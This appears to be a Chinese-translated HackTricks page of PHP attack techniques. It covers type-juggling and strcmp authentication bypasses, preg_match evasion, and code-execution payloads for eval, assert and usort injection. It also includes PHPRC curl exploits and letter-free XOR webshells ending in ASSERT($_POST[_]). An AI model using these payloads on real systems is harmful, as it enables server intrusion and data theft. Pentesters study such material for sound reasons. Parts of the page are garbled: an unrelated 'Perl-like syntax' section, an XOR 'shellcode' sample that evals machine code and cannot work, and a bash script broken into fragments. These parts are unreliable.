# PHP 技巧

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想要访问 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

## Cookies 常见位置：

这也适用于 phpMyAdmin 的 cookies。

Cookies:
```
PHPSESSID
phpMyAdmin
```
位置：
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## 绕过PHP比较

### 宽松比较/类型转换（==）

如果在PHP中使用`==`，则会出现意外情况，比较的行为与预期不符。这是因为"=="只比较转换为相同类型的值，如果您还想比较所比较数据的类型是否相同，您需要使用`===`。

PHP比较表：[https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` 以非数字开头的字符串等于数字
* `"0xAAAA" == "43690" -> True` 由十进制或十六进制格式组成的字符串可以与其他数字/字符串进行比较，如果数字相同，则结果为True（字符串中的数字被解释为数字）
* `"0e3264578" == 0 --> True` 以"0e"开头并后跟任何内容的字符串将等于0
* `"0X3264578" == 0X --> True` 以"0"开头并后跟任何字母（X可以是任何字母）和任何内容的字符串将等于0
* `"0e12334" == "0" --> True` 这非常有趣，因为在某些情况下，您可以控制字符串输入的"0"和正在进行哈希和比较的某些内容。因此，如果您可以提供一个值，该值将创建一个以"0e"开头且没有任何字母的哈希，您可以绕过比较。您可以在此处找到具有此格式的**已经哈希的字符串**：[https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` 字符串中的任何字母都等于整数0

更多信息请参阅[https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**类型转换**也会影响到`in_array()`函数的默认行为（您需要将第三个参数设置为true以进行严格比较）：
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

如果这个函数用于**任何身份验证检查**（比如检查密码），并且用户控制比较的一方，他可以发送一个空数组作为密码的值 (`https://example.com/login.php/?username=admin&password[]=`) 来绕过这个检查：
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` 也会出现相同的错误。

### 严格类型转换

即使使用了 `===`，仍然可能出现错误，使得比较容易受到类型转换的攻击。例如，如果比较在比较之前将数据转换为不同类型的对象：
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** 可以用于**验证用户输入**（它会**检查**用户输入中是否存在来自**黑名单**的**单词/正则表达式**，如果不存在，代码可以继续执行）。

#### 换行绕过

然而，当定界正则表达式的开始时，`preg_match()` **只会检查用户输入的第一行**，所以如果你以某种方式能够**将输入分成多行**，你就可以绕过这个检查。例如：
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
为了绕过这个检查，你可以使用**换行符进行URL编码**（`%0A`）发送值，或者如果你可以发送**JSON数据**，可以将其分成**多行**发送：
```php
{
"cmd": "cat /etc/passwd"
}
```
在这里找到一个例子：[https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **长度错误绕过**

（这个绕过似乎在 PHP 5.2.5 上尝试过，但在 PHP 7.3.15 上无法使其工作）\
如果你能向 `preg_match()` 发送一个有效的非常**大的输入**，它将**无法处理**它，从而使你能够**绕过**检查。例如，如果它在黑名单中列出了一个 JSON，你可以发送以下内容：
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
从：[https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

### 用于PHP混淆的类型转换技巧

Type juggling is a technique used in PHP to perform implicit type conversion. It can be used for obfuscation purposes, making code harder to understand and analyze. In this write-up, we will explore how type juggling can be used to obfuscate PHP code.

类型转换是PHP中用于执行隐式类型转换的一种技术。它可以用于混淆目的，使代码更难理解和分析。在本文中，我们将探讨如何使用类型转换来混淆PHP代码。

Type juggling in PHP occurs when a comparison or operation is performed between two variables of different types. PHP automatically converts the variables to a common type before performing the operation. This can lead to unexpected behavior and vulnerabilities if not handled properly.

在PHP中，当对两个不同类型的变量进行比较或操作时，会发生类型转换。PHP在执行操作之前会自动将变量转换为公共类型。如果处理不当，这可能导致意外行为和漏洞。

One common example of type juggling is when comparing strings and integers. In PHP, the equality operator (`==`) performs type juggling, while the identity operator (`===`) does not. This can lead to vulnerabilities if developers mistakenly use the equality operator instead of the identity operator for string and integer comparisons.

类型转换的一个常见例子是比较字符串和整数。在PHP中，等号运算符（`==`）执行类型转换，而全等运算符（`===`）则不执行。如果开发人员错误地在字符串和整数比较中使用等号运算符而不是全等运算符，这可能导致漏洞。

To obfuscate PHP code using type juggling, an attacker can manipulate the comparison or operation to achieve a desired outcome. This can involve carefully crafting input to exploit the type juggling behavior and bypass security checks.

为了使用类型转换来混淆PHP代码，攻击者可以操纵比较或操作以实现预期的结果。这可能涉及精心制作输入以利用类型转换行为并绕过安全检查。

It is important for developers to be aware of type juggling vulnerabilities and use proper comparison operators to ensure secure code. Additionally, code reviews and security testing can help identify and mitigate type juggling issues in PHP applications.

开发人员需要意识到类型转换漏洞，并使用适当的比较运算符来确保代码安全。此外，代码审查和安全测试可以帮助识别和减轻PHP应用程序中的类型转换问题。
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## 执行重定向后 (EAR)

如果 PHP 正在重定向到另一个页面，但在设置了头部的 `Location` 后没有调用 **`die`** 或 **`exit`** 函数，PHP 将继续执行并将数据附加到正文中：
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## 更多技巧

* **register\_globals**: 在 **PHP < 4.1.1.1** 版本中，或者配置错误的情况下，可能会启用 **register\_globals**（或者其行为被模拟）。这意味着在全局变量中，比如 $\_GET，如果它们有一个值，比如 $\_GET\["param"]="1234"，你可以通过 **$param 来访问它。因此，通过发送 HTTP 参数，你可以覆盖在代码中使用的变量**。
* **同一域名下的 PHPSESSION cookies 存储在同一个位置**，因此如果在一个域名下的 **不同路径使用不同的 cookies**，你可以使一个路径 **访问另一个路径的 cookie**，设置另一个路径 cookie 的值。这样，如果 **两个路径都访问同名的变量**，你可以使该变量在路径1中的值应用到路径2中。然后路径2将使用路径1的变量（通过给 cookie 设置与路径2中对应的名称）。
* 当你拥有机器上用户的 **用户名** 时，检查地址：**/\~\<USERNAME>**，看看是否激活了 php 目录。
* [**使用 php 包装器进行 LFI 和 RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

这些函数通常用于 PHP 中从密码生成哈希值，并且用于与哈希值比较以检查密码是否正确。\
支持的算法有：`PASSWORD_DEFAULT` 和 `PASSWORD_BCRYPT`（以 `$2y$` 开头）。请注意，**PASSWORD\_DEFAULT 经常与 PASSWORD\_BCRYPT 相同**。目前，**PASSWORD\_BCRYPT** 对输入的大小有一个限制，最多为 72 字节。因此，当你尝试使用此算法对大于 72 字节的内容进行哈希时，只有前 72 字节会被使用：
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP头绕过滥用PHP错误

如果一个PHP页面正在打印错误并回显用户提供的一些输入，用户可以使PHP服务器打印回一些足够长的内容，以便当它尝试将头部添加到响应时，服务器会抛出错误。\
在下面的场景中，攻击者使服务器抛出了一些大错误，正如你在屏幕上看到的，当PHP尝试修改头部信息时，它无法做到（例如CSP头部没有发送给用户）：

![](<../../../.gitbook/assets/image (465).png>)

## 代码执行

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[查看这里以获取更多有用的PHP函数](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
执行“replace”参数中的代码至少需要一个匹配项。\
这个preg_replace选项在PHP 5.5.0版本之后已经**被弃用**。

### **通过Eval()实现远程代码执行（RCE）**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **通过 Assert() 进行远程代码执行（RCE）**

这个 PHP 函数允许你执行以字符串形式编写的代码，以返回 true 或 false（并根据此来改变执行方式）。通常，用户变量会被插入到字符串的中间。例如：\
`assert("strpos($_GET['page']),'..') === false")` --> 在这种情况下，要实现 **RCE**，你可以这样做：
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
您需要**破坏**代码**语法**，**添加**您的**有效载荷**，然后再**修复**它。您可以使用**逻辑操作**，例如"**and**"或"**%26%26**"或"**|**"。请注意，"or"、"||"不起作用，因为如果第一个条件为真，我们的有效载荷将不会被执行。同样，";"也不起作用，因为我们的有效载荷不会被执行。

**另一种选择**是在字符串中添加命令的执行：`'.highlight_file('.passwd').'`

**另一种选择**（如果您有内部代码）是修改某个变量以更改执行方式：`$file = "hola"`

### **通过usort()实现远程命令执行（RCE）**

该函数用于使用特定函数对项目数组进行排序。\
要滥用此函数：
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
您还可以使用**//**来注释掉代码的其余部分。

要发现需要关闭的括号数量：

* `?order=id;}//`：我们会收到一个错误消息（`Parse error: syntax error, unexpected ';'`）。我们可能缺少一个或多个括号。
* `?order=id);}//`：我们会收到一个**警告**。看起来差不多。
* `?order=id));}//`：我们会收到一个错误消息（`Parse error: syntax error, unexpected ')' i`）。我们可能有太多的闭合括号。

### **通过.httaccess实现RCE**

如果您可以**上传**一个**.htaccess**文件，那么您可以**配置**多个内容，甚至执行代码（配置扩展名为.htaccess的文件可以**执行**）。

可以在[这里](https://github.com/wireghoul/htshells)找到不同的.htaccess shell。

### 通过环境变量实现RCE

如果您找到一个允许您在PHP中**修改环境变量**的漏洞（以及另一个允许您上传文件的漏洞，尽管通过更多的研究可能可以绕过此问题），您可以滥用此行为来获得**RCE**。

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path)：此环境变量允许您在执行其他二进制文件时加载任意库（尽管在这种情况下可能不起作用）。
* **`PHPRC`**：指示PHP在**哪里定位其配置文件**（通常称为`php.ini`）。如果您可以上传自己的配置文件，那么可以使用`PHPRC`将PHP指向它。添加一个**`auto_prepend_file`**条目，指定第二个上传的文件。这个第二个文件包含正常的**PHP代码，然后由PHP运行时在任何其他代码之前执行**。
1. 上传一个包含我们的shellcode的PHP文件
2. 上传第二个文件，其中包含一个**`auto_prepend_file`**指令，指示PHP预处理器执行我们在步骤1中上传的文件
3. 将`PHPRC`变量设置为我们在步骤2中上传的文件。
* 获取有关如何执行此链的更多信息[**来自原始报告**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)。
* **PHPRC** - 另一个选项
* 如果您**无法上传文件**，您可以在FreeBSD中使用包含**`stdin`**的“文件”`/dev/fd/0`，其中`stdin`是发送到`stdin`的请求的**正文**：
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* 或者要获得RCE，请启用**`allow_url_include`**并在文件中添加**base64 PHP代码**：
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* 技术来自[**此报告**](https://vulncheck.com/blog/juniper-cve-2023-36845)。

## PHP静态分析

查看是否可以在对这些函数的调用中插入代码（来自[这里](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)）：
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
如果您正在调试一个PHP应用程序，您可以在`/etc/php5/apache2/php.ini`中全局启用错误打印，添加`display_errors = On`，然后重新启动apache：`sudo systemctl restart apache2`

### 解混淆PHP代码

您可以使用[**www.unphp.net**](http://www.unphp.net)网站来解混淆PHP代码。

## PHP包装器和协议

PHP包装器和协议可以让您绕过系统中的写入和读取保护，并对其进行破坏。有关[**更多信息，请查看此页面**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)。

## 未经身份验证的Xdebug RCE

如果您在`phpconfig()`输出中看到**Xdebug**已启用，您应该尝试通过[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)获取RCE。

## 变量变量
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## 利用新的 $\_GET\["a"]\($\_GET\["b"]) 进行 RCE

如果在一个页面中，你可以**创建一个任意类的新对象**，那么你可能能够获得 RCE，请查看以下页面了解详情：

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## 在没有字母的情况下执行 PHP

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### 使用八进制
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **异或（XOR）**

The XOR operation, also known as exclusive OR, is a logical operation that takes two binary inputs and returns a binary output. The output is true (1) if the inputs are different, and false (0) if the inputs are the same.

In the context of hacking, XOR can be used for various purposes, such as encryption, obfuscation, and bypassing security measures. It is commonly used to hide sensitive information or manipulate data in a way that is not easily detectable.

XOR is a powerful tool in the arsenal of a hacker, as it can be used to perform bitwise operations and manipulate data at the binary level. It is often used in combination with other techniques to achieve specific goals during a penetration test or security assessment.

To perform an XOR operation, you can use XOR operators in programming languages or XOR functions in scripting languages. These operators and functions take two inputs and return the XOR result.

Understanding XOR and its applications is essential for any hacker or security professional, as it allows for creative and effective manipulation of data and systems.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR简易shell代码

根据[**这篇解析**](https://mgp25.com/ctf/Web-challenge/)，可以通过以下方式生成一个简易的shellcode：
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
所以，如果你能够**执行任意的PHP代码而不使用数字和字母**，你可以发送如下请求来滥用该有效负载来执行任意的PHP代码：
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
### XOR Shellcode（在eval内部）

```php
<?php
$shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
$key = "\x41";
$encrypted_shellcode = xor_encrypt($shellcode, $key);
eval($encrypted_shellcode);

function xor_encrypt($data, $key) {
    $encrypted_data = '';
    $key_length = strlen($key);
    $data_length = strlen($data);
    for ($i = 0; $i < $data_length; $i++) {
        $encrypted_data .= chr(ord($data[$i]) ^ ord($key[$i % $key_length]));
    }
    return $encrypted_data;
}
?>
```

This PHP code demonstrates the use of XOR encryption to obfuscate a shellcode. The shellcode is first encrypted using the XOR operation with a key. The encrypted shellcode is then evaluated using the `eval()` function.

The shellcode used in this example is a simple Linux/x86 execve("/bin/sh") shellcode. The key used for encryption is the character 'A' (0x41 in hexadecimal).

The `xor_encrypt()` function takes two parameters: the data to be encrypted and the encryption key. It iterates over each byte of the data and performs the XOR operation with the corresponding byte of the key. The result is appended to the encrypted data string.

By using XOR encryption, the shellcode becomes harder to detect and analyze, as it is obfuscated with a key. This technique can be used to bypass certain security measures and evade detection by antivirus software.
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### 类似 Perl 的语法

在 PHP 中，可以使用一些 Perl 风格的语法来简化代码。这些技巧可以提高代码的可读性和效率。

#### 1. 简化 if 语句

使用 Perl 风格的 if 语句可以使代码更简洁。例如，可以使用三元运算符来替代 if-else 语句：

```php
// 使用 if-else 语句
if ($condition) {
    $result = 'Condition is true';
} else {
    $result = 'Condition is false';
}

// 使用三元运算符
$result = $condition ? 'Condition is true' : 'Condition is false';
```

#### 2. 简化循环语句

使用 Perl 风格的循环语句可以减少代码量。例如，可以使用 foreach 循环来遍历数组：

```php
// 使用传统的 for 循环
for ($i = 0; $i < count($array); $i++) {
    $value = $array[$i];
    // 执行操作
}

// 使用 Perl 风格的 foreach 循环
foreach ($array as $value) {
    // 执行操作
}
```

#### 3. 简化字符串操作

使用 Perl 风格的字符串操作可以更方便地处理字符串。例如，可以使用正则表达式来匹配和替换字符串：

```php
// 使用传统的字符串函数
$result = str_replace('search', 'replace', $string);

// 使用 Perl 风格的正则表达式
$result = preg_replace('/search/', 'replace', $string);
```

#### 4. 简化数组操作

使用 Perl 风格的数组操作可以更快速地处理数组。例如，可以使用数组解构来快速获取数组中的值：

```php
// 使用传统的数组操作
$value1 = $array[0];
$value2 = $array[1];

// 使用 Perl 风格的数组解构
[$value1, $value2] = $array;
```

通过使用这些 Perl 风格的技巧，可以使 PHP 代码更简洁、高效。
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
